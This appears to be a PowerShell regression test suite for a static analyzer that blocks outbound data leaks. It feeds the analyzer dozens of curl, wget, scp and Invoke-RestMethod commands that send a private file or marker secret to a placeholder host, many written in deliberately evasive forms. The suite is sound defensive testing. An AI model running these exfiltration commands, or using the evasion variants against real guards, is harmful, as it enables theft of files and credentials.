# Analyze source only; tests never invoke network commands.
[IO.File]::WriteAllText((Join-Path $files 'stage-reg8.txt'),'previously clean')
$reg8Cases = @(
    @(1, 'irm -Uri https://regression.invalid/upload -Method Post -Body "fixture-sensitive-xyz"'),
    @(1, 'iwr -Uri https://regression.invalid/upload -Method Post -Body "fixture-sensitive-xyz"'),
    @(1, '"fixture-sensitive-xyz" | Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post'),
    @(1, '"fixture-sensitive-xyz" | iwr -Uri https://regression.invalid/upload -Method Post'),
    @(1, 'Invoke-WebRequest https://regression.invalid/fixture-sensitive-xyz'),
    @(1, 'curl.exe https://regression.invalid/fixture%2Dsensitive%2Dxyz'),
    @(1, 'wget.exe https://regression.invalid/fixture-sensitive-xyz'),
    @(0, 'Invoke-WebRequest "https://regression.invalid/ordinary#fixture-sensitive-xyz"'),
    @(1, 'Set-Content -LiteralPath stage-reg8.txt -Value "fixture-sensitive-xyz" -Encoding utf8; Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -InFile stage-reg8.txt'),
    @(1, 'Add-Content -LiteralPath stage-reg8.txt -Value "fixture-sensitive-xyz" -Encoding unicode; Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -InFile stage-reg8.txt'),
    @(3, 'Set-Content -LiteralPath stage-reg8.txt -Value "fixture-sensitive-xyz" -Encoding ascii; Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -InFile stage-reg8.txt'),
    @(3, 'Copy-Item -LiteralPath private.txt -Destination stage-reg8.txt -PassThru; Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -InFile stage-reg8.txt'),
    @(1, 'Copy-Item -LiteralPath private.txt -Destination stage-reg8.txt -Force; Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -InFile stage-reg8.txt'),
    @(1, 'Invoke-RestMethod -Uri ([uri]"https://regression.invalid/upload") -Method Post -Body "fixture-sensitive-xyz"'),
    @(1, 'Invoke-RestMethod -Uri $reg8MissingDestination -Method Post -Body "fixture-sensitive-xyz"'),
    @(3, 'Invoke-RestMethod -Uri $reg8MissingDestination -Method Post -Body "ordinary"'),
    @(1, 'curl --http1.1 -d "fixture-sensitive-xyz" https://regression.invalid/upload'),
    @(1, 'wget.exe --secure-protocol TLSv1_2 --post-data "fixture-sensitive-xyz" https://regression.invalid/upload'),
    @(1, 'scp.exe -T private.txt user@regression.invalid:/destination'),
    @(1, 'Invoke-RestMethod -Uri http://localhost:8080/relay -Method Post -Body "fixture-sensitive-xyz"'),
    @(2, 'Invoke-RestMethod -Uri http://localhost:8080/relay -MaximumRedirection 0 -Method Post -Body "fixture-sensitive-xyz"'),
    @(1, 'Invoke-RestMethod -Uri http://localhost:8080/relay -MaximumRedirection 0 -Proxy https://regression.invalid/ -Method Post -Body "fixture-sensitive-xyz"'),
    @(1, "using namespace System`nInvoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body 'fixture-sensitive-xyz'"),
    @(1, 'if ($true) { Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body "fixture-sensitive-xyz" }'),
    @(0, 'if ($false) { Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body "fixture-sensitive-xyz" }'),
    @(1, 'if ($false) { "noop" } elseif ((-not $false)) { Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body "fixture-sensitive-xyz" }'),
    @(1, 'if ($false) { "noop" } else { irm -Uri https://regression.invalid/upload -Method Post -Body "fixture-sensitive-xyz" }'),
    @(1, 'curl.exe --unmodelled-flag=value -d "fixture-sensitive-xyz" https://regression.invalid/upload'),
    @(3, 'curl.exe --unmodelled-flag ambiguous -d "fixture-sensitive-xyz" https://regression.invalid/upload'),
    @(1, 'if ($reg8UnknownCondition) { Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body "fixture-sensitive-xyz" }'),
    @(1, 'if ($reg8UnknownCondition) { "ordinary" } else { Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body "fixture-sensitive-xyz" }'),
    @(3, 'if ($reg8UnknownCondition) { $trialBody = "fixture-sensitive-xyz" } else { Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body $trialBody }'),
    @(1, 'if ($reg8UnknownCondition) { $trialBody = "fixture-sensitive-xyz" } else { $trialBody = "fixture-sensitive-xyz" }; Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body $trialBody'),
    @(3, 'if ($reg8UnknownCondition) { $trialBody = "fixture-sensitive-xyz" } else { $trialBody = "ordinary" }; Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body $trialBody'),
    @(3, 'if ($reg8UnknownCondition) { $trialBody = "fixture-sensitive-xyz" }; Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body $trialBody'),
    @(1, "using module 'Q:\unavailable-guard-fixture.psm1'`nInvoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body 'fixture-sensitive-xyz'"),
    @(1, 'Get-Date; irm -Uri https://regression.invalid/upload -Method Post -Body "fixture-sensitive-xyz"'),
    @(1, 'Write-Verbose ordinary; iwr -Uri https://regression.invalid/upload -Method Post -Body "fixture-sensitive-xyz"'),
    @(1, 'curl.exe -d "fixture-sensitive-xyz" https://a.regression.invalid/ https://b.regression.invalid/'),
    @(1, 'wget.exe --post-data "fixture-sensitive-xyz" https://a.regression.invalid/ https://b.regression.invalid/'),
    @(1, 'curl.exe -d "fixture-sensitive-xyz" http://localhost:8080/ https://b.regression.invalid/'),
    @(2, 'curl.exe -d "ordinary" https://a.regression.invalid/ https://b.regression.invalid/'),
    @(1, '$regFile=Get-Content private.txt -Raw; $regUrl="https://regression.invalid/?data=" + $regFile; Invoke-RestMethod -Uri $regUrl'),
    @(1, 'Invoke-RestMethod -Uri https://fixture-sensitive-xyz.regression.invalid/'),
    @(1, 'curl.exe https://fixture-sensitive-xyz@regression.invalid/'),
    @(1, '$regSecret="fixture-sensitive-xyz"; $regFlag=$true; if ($regFlag) { irm -Uri https://regression.invalid/upload -Method Post -Body $regSecret }'),
    @(0, '$regSecret="fixture-sensitive-xyz"; $regFlag=$false; if ($regFlag) { irm -Uri https://regression.invalid/upload -Method Post -Body $regSecret }'),
    @(1, '$regSecret="fixture-sensitive-xyz"; if ($regUnknownBranch) { irm -Uri https://regression.invalid/upload -Method Post -Body $regSecret }'),
    @(1, 'Get-Content private.txt -Raw -Encoding utf8 | irm -Uri https://regression.invalid/upload -Method Post'),
    @(1, 'curl.exe -F "file=@private.txt;type=text/plain" https://regression.invalid/upload'),
    @(1, 'scp.exe -J jump.regression.invalid private.txt user@regression.invalid:/incoming'),
    @(1, 'Write-Output "ordinary" | Write-Output | Sort-Object | Get-Content -LiteralPath private.txt -Raw | Write-Output | irm -Uri https://regression.invalid/upload -Method Post'),
    @(1, ('Write-Output "ordinary" | Write-Output | Write-Verbose | Get-Content -LiteralPath "{0}" -Raw | Write-Output | irm -Uri https://regression.invalid/upload -Method Post' -f $inputFile)),
    @(3, 'Write-Output "fixture-sensitive-xyz" | Write-Output | Sort-Object | Write-Output | Write-Output | irm -Uri https://regression.invalid/upload -Method Post'),
    @(3, "using assembly 'Q:\unavailable-guard-fixture.dll'`nGet-Date"),
    @(1, "using module @{ModuleName='nonexistent-guard-fixture';ModuleVersion='1.0'}`nInvoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body 'fixture-sensitive-xyz'"),
    @(1, "using assembly 'Q:\unavailable-guard-fixture.dll'; Invoke-RestMethod -Uri https://regression.invalid/upload -Method Post -Body 'fixture-sensitive-xyz'")
)
$reg8Index=0
foreach ($row in $reg8Cases) {
    $reg8Index++
    $event=Scan $row[1]
    Is $row[0] $event "eight-issue regression $reg8Index"
    if ($reg8Index -in 5,6,7 -and $event.report.policy.evidence[0].endpoint -match 'fixture') { throw 'Endpoint exposed path content' }
}
"PASS: $reg8Index regressions across the Guard findings."


# One whole-script decision; all independent sends and sources are still inspected.
$multiFindingScript = @(
    'irm -Uri https://first.regression.invalid/ -Body "fixture-sensitive-xyz" -Method Post'
    'Get-Content -LiteralPath private.txt -Raw | irm -Uri https://second.regression.invalid/ -Method Post'
    'Get-Content -LiteralPath protected/a.txt -Raw | Out-Null'
    'curl.exe -d "fixture-sensitive-xyz" https://third.regression.invalid/'
) -join "; "
$multiFinding = Scan $multiFindingScript
Is 1 $multiFinding 'block is accumulated, not an early return'
$hits = @($multiFinding.report.policy.evidence | Where-Object { $_.decision -like 'block:*' })
if ($hits.Count -ne 3 -or $hits[1].flow[0].ruleId -ne 'file-policy') {
    throw 'Later outbound findings were not evaluated after the first block'
}
$reads=@($multiFinding.report.policy.sensitiveSources | Where-Object kind -eq 'file')
if (@($reads | Where-Object { $_.source -match 'private\.txt$' }).Count -eq 0 -or
    @($reads | Where-Object { $_.source -match 'protected[\\/]a\.txt$' }).Count -eq 0) {
    throw 'Later sensitive file reads were not recorded'
}
$writeResult = Scan 'Invoke-WebRequest -Uri https://first.regression.invalid/ -OutFile stage-reg8.txt; curl.exe --data-binary "@stage-reg8.txt" https://second.regression.invalid/'
Is 3 $writeResult 'response output file cannot be evaluated using old bytes'
$variableResult = Scan '$guardStatus="fixture-sensitive-xyz"; Invoke-RestMethod -Uri https://first.regression.invalid/ -StatusCodeVariable guardStatus; irm -Uri https://second.regression.invalid/ -Body $guardStatus -Method Post'
Is 3 $variableResult 'network status output invalidates the named variable'
$pipelineRecovery = Scan 'Write-Output "ordinary" | Sort-Object | Get-Content -LiteralPath private.txt -Raw | irm -Uri https://regression.invalid/ -Method Post'
Is 1 $pipelineRecovery 'graph restarts with independent source at any position'
$stage = $pipelineRecovery.report.policy.evidence[0]
if ($stage.stage -ne 4 -or $stage.chain -ne 2) { throw "Unexpected stage and dependency chain: $($stage.stage)/$($stage.chain)" }
'PASS: complete scan after first block, scoped output effects, and independent source/chain evidence.'


$typedAndNested = @(
    @(1, '$flag=0; if ($flag) { "ordinary" } else { irm -Uri https://regression.invalid/ -Method Post -Body "fixture-sensitive-xyz" }'),
    @(0, '$flag="0"; if ($flag) { "ordinary" } else { irm -Uri https://regression.invalid/ -Method Post -Body "fixture-sensitive-xyz" }'),
    @(1, '$flag=0.0; if ($flag) { "ordinary" } else { irm -Uri https://regression.invalid/ -Method Post -Body "fixture-sensitive-xyz" }'),
    @(0, '$flag=0.5; if ($flag) { "ordinary" } else { irm -Uri https://regression.invalid/ -Method Post -Body "fixture-sensitive-xyz" }'),
    @(1, '$secret=Get-Content private.txt -Raw; $url="https://regression.invalid/?data=" + $secret + "#note"; irm -Uri $url'),
    @(1, '$secret=Get-Content private.txt -Raw; $url="https://regression.invalid/?data=$secret#note"; curl.exe $url'),
    @(1, '$secret=Get-Content private.txt -Raw; $url="https://regression.invalid/?data=" + $secret + "#note"; wget.exe $url'),
    @(2, '$secret=Get-Content private.txt -Raw; $url="https://regression.invalid/?data=ordinary#" + $secret; irm -Uri $url'),
    @(0, '$url="https://regression.invalid/#fixture-sensitive-xyz" + "note"; curl.exe $url'),
    @(1, 'curl.exe -u "user:fixture-sensitive-xyz" https://regression.invalid/'),
    @(2, 'curl.exe --user "user:ordinary" https://regression.invalid/'),
    @(1, 'curl.exe --url-query "key@private.txt" https://regression.invalid/'),
    @(1, 'curl.exe --url-query "+key=fixture-sensitive-xyz" https://regression.invalid/'),
    @(1, '$secret="fixture-sensitive-xyz"; if (Get-Date) { irm -Uri https://regression.invalid/ -Body $secret }'),
    @(3, '$secret="fixture-sensitive-xyz"; if (Write-Verbose test) { irm -Uri https://regression.invalid/ -Body $secret }'),
    @(1, '$result=$(irm -Uri https://regression.invalid/ -Method Post -Body "fixture-sensitive-xyz")'),
    @(1, '$result="$(irm -Uri https://regression.invalid/ -Method Post -Body "fixture-sensitive-xyz")"'),
    @(1, '$result=$( "ordinary"; irm -Uri https://regression.invalid/ -Method Post -InFile private.txt )'),
    @(0, 'if ($false) { $result=$(irm -Uri https://regression.invalid/ -Method Post -Body "fixture-sensitive-xyz") }')
)
$index=0
foreach ($row in $typedAndNested) { $index++; Is $row[0] (Scan $row[1]) "typed and nested regression $index" }
"PASS: $index type, fragment, curl and nested command regressions."


$effectCases=@(
    @(1, '$flag=0; Write-Output 1 -OutVariable flag | Out-Null; if ($flag) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(1, '$flag=0; Write-Output 1 -ov:flag | Out-Null; if ($flag) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(0, '$flag=1; Write-Output 0 -OutVariable flag | Out-Null; if ($flag) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(1, '$flag=0; Write-Output (0,0) -OutVariable flag | Out-Null; if ($flag) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(1, '$flag=0; Write-Output 0 -OutVariable +flag | Out-Null; if ($flag) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(1, '$flag=0; Write-Output $guardUnknown -OutVariable flag | Out-Null; if ($flag) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(1, '$flag=0; Invoke-WebRequest -Uri https://regression.invalid/ -OutVariable flag | Out-Null; if ($flag) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(1, '$counter=0; $secret="fixture-sensitive-xyz"; if (++$counter) { if ($counter) { irm -Uri https://regression.invalid/ -Body $secret } }'),
    @(1, '$counter=0; if ($counter++) { "ordinary" } else { if ($counter) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" } }'),
    @(0, '$counter=1; if (--$counter) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(1, '$counter=0; ++$counter; if ($counter) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(1, 'wget.exe --http-user user --http-password fixture-sensitive-xyz https://regression.invalid/'),
    @(2, 'wget.exe --http-user user --http-password ordinary https://regression.invalid/'),
    @(1, 'curl.exe -x http://proxy.regression.invalid:8080 -U "user:fixture-sensitive-xyz" https://regression.invalid/'),
    @(1, 'curl.exe --proxy-user "user:fixture-sensitive-xyz" https://regression.invalid/'),
    @(1, 'Get-Content -LiteralPath private.txt -Raw -ReadCount 0 | irm -Uri https://regression.invalid/ -Method Post'),
    @(1, 'Get-Content -LiteralPath private.txt -ReadCount 1 | irm -Uri https://regression.invalid/ -Method Post'),
    @(1, 'Get-Content -LiteralPath private.txt -ReadCount 2 | irm -Uri https://regression.invalid/ -Method Post'),
    @(1, 'Get-Content -LiteralPath private.txt -ReadCount 0 | curl.exe --data-binary "@-" https://regression.invalid/')
)
$effectIndex=0
foreach ($row in $effectCases) { $effectIndex++; Is $row[0] (Scan $row[1]) "state effects regression $effectIndex" }
"PASS: $effectIndex output-variable, increment, authentication and ReadCount regressions."


$bindingCases=@(
    @(1, '$flag=0; Write-Output 1 -OutV flag | Out-Null; if ($flag) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(0, '$flag=1; Write-Output 0 -OutVa:flag | Out-Null; if ($flag) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(0, '$flag=0; Write-Output 1 -OutB 1 | Out-Null; if ($flag) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(1, 'Get-Content private.txt -Raw -OutVariable captured | Out-Null; irm -Uri https://regression.invalid/ -Method Post -Body $captured[0]'),
    @(1, 'Get-Content -Lit private.txt -Raw -OutV:captured | Out-Null; irm -Uri https://regression.invalid/ -Method Post -Body $captured[0]'),
    @(1, 'Get-Content private.txt -ov captured | Out-Null; irm -Uri https://regression.invalid/ -Method Post -Body $captured[0]'),
    @(2, 'Get-Content protected-old/a.txt -Raw -ov captured | Out-Null; irm -Uri https://regression.invalid/ -Method Post -Body $captured[0]'),
    @(3, '$captured=@("fixture-sensitive-xyz"); Get-Content unknown-binding.txt -Raw -OutV captured | Out-Null; irm -Uri https://regression.invalid/ -Body $captured[0]'),
    @(1, '$i=0; if ((++$i) -eq 1) { if ($i) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" } }'),
    @(1, '$i=0; if (1 -eq (++$i)) { if ($i) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" } }'),
    @(0, '$i=0; if ((++$i) -eq 2) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }'),
    @(1, '$i=0; if (($i++) -eq 0) { if ($i) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" } }'),
    @(0, '$i=0; if ((++$i) -eq 1) { if ($i -eq 2) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" } }'),
    @(1, '$i=0; if ((++$i) -gt 1) { "ordinary" } else { if ($i) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" } }'),
    @(1, '$i=0; if ((++$i) -eq $unknownBindCompare) { if ($i) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" } }')
)
$bindingIndex=0
foreach ($row in $bindingCases) {
    $bindingIndex++
    $event=Scan $row[1]
    Is $row[0] $event "binding and comparison regression $bindingIndex"
    if ($bindingIndex -in 4,5,6 -and $event.report.policy.decision -ne 'block:file-policy') {
        throw 'Captured file must be blocked by provenance, not a text rule'
    }
}
"PASS: $bindingIndex abbreviated capture, provenance and comparison-effect regressions."

# Only the fixture setup executes; all send commands are passed to the analyzer as source.
$objectCases = @(
    @(1, 'inline multipart file', '$form=@{file=Get-Item -LiteralPath private.txt}; irm -Uri https://regression.invalid/upload -Method Post -Form $form'),
    @(1, 'multipart referenced file', '$file=Get-Item private.txt; iwr -Uri https://regression.invalid/upload -Method Post -Form @{attachment=$file}'),
    @(1, 'multipart collection of files', 'irm -Uri https://regression.invalid/upload -Method Post -Form @{files=@((Get-Item protected-old/a.txt),(Get-Item private.txt))}'),
    @(2, 'multipart ordinary file', 'irm -Uri https://regression.invalid/upload -Method Post -Form @{file=(Get-Item protected-old/a.txt)}'),
    @(2, 'multipart string is not a file', 'irm -Uri https://regression.invalid/upload -Method Post -Form @{file="private.txt"}'),
    @(3, 'multipart unresolved file', 'irm -Uri https://regression.invalid/upload -Method Post -Form @{file=(Get-Item missing-fixture.dat)}'),
    @(3, 'multipart directory is not a file', 'irm -Uri https://regression.invalid/upload -Method Post -Form @{file=(Get-Item protected)}'),
    @(0, 'local FileInfo has no outbound effect', '$file=Get-Item private.txt; $form=@{file=$file}'),
    @(1, 'multipart file content matches a text rule', 'irm -Uri https://regression.invalid/upload -Method Post -Form @{file=(Get-Item marker-form.txt)}'),
    @(1, 'pipeline JSON retains file provenance', '$secret=Get-Content private.txt -Raw; $json=@{data=$secret} | ConvertTo-Json -Compress; irm -Uri https://regression.invalid/upload -Method Post -ContentType application/json -Body $json'),
    @(1, 'explicit JSON input with nested fields', '$secret=Get-Content private.txt -Raw; $json=ConvertTo-Json -InputObject @{envelope=@{data=$secret}} -Depth 2 -Compress; irm -Uri https://regression.invalid/upload -Method Post -Body $json'),
    @(1, 'pretty JSON retains file provenance', '$secret=Get-Content private.txt -Raw; $json=@{data=$secret} | ConvertTo-Json; iwr -Uri https://regression.invalid/upload -Method Post -Body $json'),
    @(2, 'ordinary JSON', '$json=@{data="ordinary"} | ConvertTo-Json -Compress; irm -Uri https://regression.invalid/upload -Method Post -Body $json'),
    @(3, 'depth-truncated nested contents are not sent', '$secret=Get-Content private.txt -Raw; $json=@{envelope=@{data=$secret}} | ConvertTo-Json -Depth 0 -Compress; irm -Uri https://regression.invalid/upload -Method Post -Body $json'),
    @(3, 'JSON FileInfo metadata does not contain file bytes', '$file=Get-Item private.txt; $json=@{data=$file} | ConvertTo-Json -Compress; irm -Uri https://regression.invalid/upload -Method Post -Body $json'),
    @(1, 'retain definite JSON provenance with unrelated unknown field', '$secret=Get-Content private.txt -Raw; $json=@{data=$secret;extra=$unknownGuardJsonField} | ConvertTo-Json -Compress; irm -Uri https://regression.invalid/upload -Method Post -Body $json'),
    @(1, 'early incomplete field does not suppress multipart evidence', 'irm -Uri https://regression.invalid/upload -Method Post -Form @{extra=$unknownGuardFormField;file=(Get-Item private.txt)}')
)
[IO.File]::WriteAllText((Join-Path $files 'marker-form.txt'), 'fixture-sensitive-xyz')
foreach ($row in $objectCases) {
    $event=Scan $row[2]
    Is $row[0] $event $row[1]
    if ($row[0] -eq 1 -and $row[1] -ne 'multipart file content matches a text rule' -and
        $event.report.policy.decision -ne 'block:file-policy') {
        throw "$($row[1]): expected a file-only policy match"
    }
}
Is 0 (Scan '$global:guardRuntimeForm=@{file=(Get-Item -LiteralPath private.txt)}' -ExecuteLocal) 'runtime FileInfo setup'
$runtimeForm = Scan 'irm -Uri https://regression.invalid/upload -Method Post -Form $global:guardRuntimeForm'
Is 1 $runtimeForm 'multipart runtime FileInfo'
if ($runtimeForm.report.policy.decision -ne 'block:file-policy') { throw 'Runtime multipart source lost its file label' }
"PASS: $($objectCases.Count + 1) multipart FileInfo and JSON provenance regressions."
